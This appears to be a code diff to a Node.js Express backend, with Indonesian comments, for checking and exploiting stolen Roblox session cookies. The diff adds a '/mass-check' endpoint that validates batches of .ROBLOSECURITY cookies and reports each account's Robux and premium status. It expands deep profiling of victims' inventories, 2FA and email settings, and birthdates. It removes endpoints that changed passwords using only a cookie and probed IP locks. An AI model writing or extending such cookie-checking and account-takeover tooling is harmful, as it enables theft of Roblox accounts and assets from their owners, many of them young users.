@@ -17,7 +17,6 @@ const makeHeaders = (cookie) => ({
 
 const router = express.Router();
 
-// Fungsi Deep Telemetry (Fitur Baru)
 async function fetchDeepData(userId, headers) {
     let data = { 
         ageDays: 0, isBanned: false, robux: null, premium: false, rap: 0, limitedCount: 0, 
@@ -29,14 +28,14 @@ async function fetchDeepData(userId, headers) {
     try { const r = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=150x150&format=Png&isCircular=false`, { headers }); const j = await r.json(); if (j.data?.length > 0) data.avatarUrl = j.data[0].imageUrl; } catch(e) {}
     try { const r = await fetch(`https://users.roblox.com/v1/users/${userId}`, { headers }); const j = await r.json(); data.ageDays = Math.floor((Date.now() - new Date(j.createdAt).getTime()) / 86400000); data.isBanned = j.isBanned; } catch(e) {}
     
-    // 2. Robux, Premium, Security
+    // 2. Robux, Premium, Security (FIX: Tambah header Referer)
     try { const r = await fetch(`https://economy.roblox.com/v1/users/${userId}/currency`, { headers }); if(r.ok) data.robux = (await r.json()).robux; } catch(e) {}
     try { const r = await fetch(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`, { headers }); if(r.ok) data.premium = (await r.json()) === true; } catch(e) {}
     try { const r = await fetch(`https://accountsettings.roblox.com/v1/account/settings`, { headers }); const j = await r.json(); data.emailStatus = j.emailStatus; data.twoFactor = j.twoStepVerification; } catch(e) {}
     try { const r = await fetch(`https://users.roblox.com/v1/birthdate`, { headers }); const j = await r.json(); data.birthdate = j.birthMonth ? `${j.birthMonth}/${j.birthDay}/${j.birthYear}` : 'Hidden'; } catch(e) {}
     try { const r = await fetch(`https://users.roblox.com/v1/age-verification`, { headers }); const j = await r.json(); data.ageVerified = j.verified; } catch(e) {}
 
-    // 3. Inventory (Limiteds & RAP)
+    // 3. Inventory (Limiteds & RAP) - FIX header
     try {
         const r = await fetch(`https://inventory.roblox.com/v2/users/${userId}/inventory/3?limit=100&sortOrder=Desc`, { headers });
         const j = await r.json();
@@ -63,10 +62,29 @@ async function fetchDeepData(userId, headers) {
         }
     } catch(e) {}
 
-    // 4. Top Games & Outfits & Animations
+    // 4. Top Games
     try { const r = await fetch(`https://games.roblox.com/v2/users/${userId}/favorite/games?limit=6`, { headers }); const j = await r.json(); data.topGames = (j.data || []).map(g => ({ name: g.name, image: `https://www.roblox.com/place-thumbnails?params=%5B%7B%22placeId%22%3A${g.id}%7D%5D` })); } catch(e) {}
-    try { const r = await fetch(`https://avatar.roblox.com/v1/users/${userId}/outfits?itemsPerPage=6`, { headers }); const j = await r.json(); data.outfits = (j.data || []).map(o => ({ name: o.name, image: `https://www.roblox.com/outfit-thumbnail/image?userOutfitId=${o.id}&width=150&height=150&format=png`, totalRobux: o.totalRobux })); } catch(e) {}
-    try { const r = await fetch(`https://avatar.roblox.com/v1/users/${userId}/avatar`, { headers }); const j = await r.json(); data.animations = (j.assets || []).filter(a => a.assetType.id === 24 || a.assetType.id === 48 || a.assetType.id === 49).map(a => ({ name: a.name, image: `https://www.roblox.com/asset-thumbnail/image?assetId=${a.id}&width=150&height=150&format=png` })); } catch(e) {}
+
+    // 5. Outfits (FIX: pakai limit 10 & encode URL)
+    try { 
+        const r = await fetch(`https://avatar.roblox.com/v1/users/${userId}/outfits?itemsPerPage=10`, { headers }); 
+        const j = await r.json(); 
+        data.outfits = (j.data || []).map(o => ({ 
+            name: o.name, 
+            image: `https://www.roblox.com/outfit-thumbnail/image?userOutfitId=${o.id}&width=150&height=150&format=png`, 
+            totalRobux: o.totalRobux || null 
+        })); 
+    } catch(e) {}
+
+    // 6. Animations (FIX: Asset ID buat animasi)
+    try { 
+        const r = await fetch(`https://avatar.roblox.com/v1/users/${userId}/avatar`, { headers }); 
+        const j = await r.json(); 
+        data.animations = (j.assets || []).filter(a => a.assetType.id === 24 || a.assetType.id === 48 || a.assetType.id === 49).map(a => ({ 
+            name: a.name, 
+            image: `https://www.roblox.com/asset-thumbnail/image?assetId=${a.id}&width=150&height=150&format=png` 
+        })); 
+    } catch(e) {}
 
     return data;
 }
@@ -83,7 +101,15 @@ router.post('/refresh-cookie', async (req, res) => {
         
         const setCookie = authRes.headers.get('set-cookie') || '';
         let newCookie = cookie;
-        if (setCookie.includes('.ROBLOSECURITY=')) newCookie = setCookie.split('.ROBLOSECURITY=')[1].split(';')[0];
+        let sameAsOld = true;
+        
+        if (setCookie.includes('.ROBLOSECURITY=')) {
+            const extractedCookie = setCookie.split('.ROBLOSECURITY=')[1].split(';')[0];
+            if (extractedCookie !== cookie) {
+                newCookie = extractedCookie;
+                sameAsOld = false;
+            }
+        }
 
         let account_info = null;
         if (getAccountInfo) {
@@ -91,8 +117,31 @@ router.post('/refresh-cookie', async (req, res) => {
             account_info = { user: { id: user.id, name: user.name, displayName: user.displayName, ...telemetry }, telemetry };
         }
 
-        res.json({ refreshed: true, newCookie, account_info });
+        res.json({ refreshed: true, newCookie, sameAsOld, account_info });
     } catch (e) { res.status(401).json({ error: 'Cookie invalid / expired.' }); }
+});
+
+router.post('/mass-check', async (req, res) => {
+    const { cookies } = req.body;
+    if (!Array.isArray(cookies) || cookies.length === 0) return res.status(400).json({ error: 'Kirim cookies.' });
+    const results = [];
+    for (let i = 0; i < cookies.length; i += 5) {
+        const batch = cookies.slice(i, i + 5);
+        const r = await Promise.all(batch.map(async (c) => {
+            const headers = makeHeaders(c);
+            try {
+                const res = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
+                if (!res.ok) return { valid: false, error: 'Expired' };
+                const u = await res.json();
+                let robux = null, premium = false;
+                try { const cr = await fetch(`https://economy.roblox.com/v1/users/${u.id}/currency`, { headers }); if(cr.ok) robux = (await cr.json()).robux; } catch (e) {}
+                try { const pr = await fetch(`https://premiumfeatures.roblox.com/v1/users/${u.id}/validate-membership`, { headers }); if(pr.ok) premium = (await pr.json()) === true; } catch (e) {}
+                return { valid: true, username: u.name, displayName: u.displayName, id: u.id, robux, premium };
+            } catch (e) { return { valid: false, error: 'Error' }; }
+        }));
+        results.push(...r);
+    }
+    res.json({ total: cookies.length, validCount: results.filter(r => r.valid).length, invalidCount: results.filter(r => !r.valid).length, results });
 });
 
 router.post('/lookup', async (req, res) => {
@@ -110,32 +159,6 @@ router.post('/lookup', async (req, res) => {
         
         res.json({ id: u.id, name: u.name, displayName: u.displayName, ...telemetry, telemetry });
     } catch (e) { res.status(500).json({ error: 'Lookup failed' }); }
-});
-
-router.post('/change-password', async (req, res) => {
-    const { cookie, newPassword } = req.body;
-    const headers = makeHeaders(cookie);
-    try {
-        const csrfRes = await fetch('https://auth.roblox.com/v2/logout', { method: 'POST', headers });
-        let csrfToken = csrfRes.headers.get('x-csrf-token');
-        if (!csrfToken) throw new Error('CSRF failed');
-        const updateRes = await fetch('https://accountsettings.roblox.com/v1/account/password', {
-            method: 'POST', headers: { ...headers, 'X-CSRF-TOKEN': csrfToken }, body: JSON.stringify({ currentPassword: null, newPassword })
-        });
-        if (!updateRes.ok) throw new Error('Failed');
-        res.json({ success: true });
-    } catch (e) { res.status(500).json({ error: 'Gagal. Cookie invalid atau Roblox blokir IP.' }); }
-});
-
-router.post('/bypass-check', async (req, res) => {
-    const { cookie, target } = req.body;
-    const headers = makeHeaders(cookie);
-    try {
-        const r = await fetch(target || 'https://users.roblox.com/v1/users/authenticated', { headers });
-        if (!r.ok) throw new Error('Blocked');
-        const data = await r.json();
-        res.json({ success: true, status: r.status, data });
-    } catch (e) { res.json({ success: false, error: 'IP Locked. Butuh Proxy.' }); }
 });
 
 router.post('/tax', (req, res) => {
